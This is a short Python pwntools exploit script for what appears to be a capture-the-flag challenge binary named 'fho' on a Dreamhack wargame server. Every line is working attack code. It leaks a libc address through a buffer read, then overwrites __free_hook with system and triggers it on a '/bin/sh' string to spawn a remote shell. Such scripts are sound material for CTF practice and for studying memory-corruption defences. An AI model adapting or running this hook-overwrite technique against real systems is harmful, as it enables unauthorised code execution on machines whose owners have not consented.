from os import lseek
from pwn import *

p = process("./fho")
p = remote("host1.dreamhack.games", 16080)
e = ELF("./fho")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("/home/juho/Downloads/libc/libc-2.27.so")
def slog(name, addr): return success(" ".join([name, hex(addr)]))

# [1] leak libc base
buf = b"A"*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)

libc_start_main_xx = p.recvline()[:-1]+b"\x00"*2
libc_start_main_xx = u64(libc_start_main_xx)
print(libc_start_main_xx)
print(p64(libc_start_main_xx))
#libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 0xf3)
libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 231)
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

slog("libc_base", libc_base)
slog("system", system)
slog("free_hook", free_hook)
slog("/bin/sh", binsh)

# [2] overwrite 'free_hook' with 'system'
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(system))

# [3] exploit 
p.recvuntil("To free: ")
p.sendline(str(binsh))

p.interactive()